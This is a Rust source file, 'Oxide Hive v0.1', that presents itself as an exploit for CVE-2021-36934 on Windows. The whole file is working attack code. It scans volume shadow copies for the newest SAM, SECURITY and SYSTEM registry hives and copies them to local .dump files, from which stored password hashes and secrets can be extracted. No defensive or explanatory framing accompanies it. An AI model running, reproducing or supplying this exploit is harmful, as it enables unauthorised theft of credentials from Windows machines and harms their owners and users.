use std::{
    env,
    fs::{self, File},
    process,
};

fn get_hive(path: &str, search_depth: i32) -> Option<String> {
    let base = "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy";
    let mut youngest = None;
    let mut latest = None;

    for i in 1..=search_depth {
        let full_path = format!("{}{}\\{}", base, i, path);

        let file = match File::open(&full_path) {
            Ok(file) => file,
            Err(_) => continue,
        };

        let metadata = match file.metadata() {
            Ok(meta) => meta,
            Err(_) => {
                println!(
                    "Couldn't fetch metadata for exising file: \"{}\" \n",
                    &full_path
                );
                continue;
            }
        };

        let modified = match metadata.modified() {
            Ok(modif) => modif,
            Err(_) => {
                println!(
                    "Couldn't fetch last modified from metadata of file: \"{}\" \n",
                    &full_path
                );
                continue;
            }
        };

        let elapsed = match modified.elapsed() {
            Ok(elapsed_time) => elapsed_time,
            Err(_) => {
                println!(
                    "Couldn't fetch elapsed time since last modification of file: \"{}\" \n",
                    &full_path
                );
                continue;
            }
        };

        if youngest.is_none() {
            latest = Some(full_path.clone());
            youngest = Some(elapsed);
            println!("Found copy: {} \n", &full_path);
        } else if elapsed < youngest.unwrap() {
            latest = Some(full_path.clone());
            youngest = Some(elapsed);
            println!("Found newer copy: {} \n", &full_path);
        }
    }

    return latest;
}

fn copy_hive(hive_path: String, copy_path: &str, hive_name: &str) {
    match fs::copy(hive_path, copy_path) {
        Ok(_) => println!("Successfully collected {} hive \n", hive_name),
        Err(error) => println!("Couldn't collect {} hive: {} \n", hive_name, error),
    }
}

fn main() {
    let args: Vec<String> = env::args().collect();

    let mut search_depth = 15;

    if args.len() > 2 {
        println!("Usage: {} [max shadow copies (15)]", args[0]);
        process::exit(0);
    } else if args.len() == 2 {
        match args[1].parse() {
            Ok(depth) => search_depth = depth,
            Err(_) => {
                println!("Usage: {} [max shadow copies (15)]", args[0]);
                process::exit(0);
            }
        }
    }

    println!("Oxide Hive v0.1 \nExploit for CVE-2021-36934 \n\n");

    let sam_path = "Windows\\System32\\config\\SAM";
    let security_path = "Windows\\System32\\config\\SECURITY";
    let system_path = "Windows\\System32\\config\\SYSTEM";

    println!("Searching for SAM hive... \n");
    let sam_hive = get_hive(sam_path, search_depth);
    match sam_hive {
        Some(path) => copy_hive(path, ".\\SAM.dump", "SAM"),
        None => println!("Couldn't find/open SAM hive \n"),
    };

    println!("\nSearching for SECURITY hive... \n");
    let security_hive = get_hive(security_path, search_depth);
    match security_hive {
        Some(path) => copy_hive(path, ".\\SECURITY.dump", "SECURITY"),
        None => println!("Couldn't find/open SECURITY hive \n"),
    }

    println!("\nSearching for SYSTEM hive... \n");
    let system_hive = get_hive(system_path, search_depth);
    match system_hive {
        Some(path) => copy_hive(path, ".\\SYSTEM.dump", "SYSTEM"),
        None => println!("Couldn't find/open SYSTEM hive \n"),
    }

    println!("\nFinished exploiting, provided that there were no errors, hives have been dumped to current working directory");
}
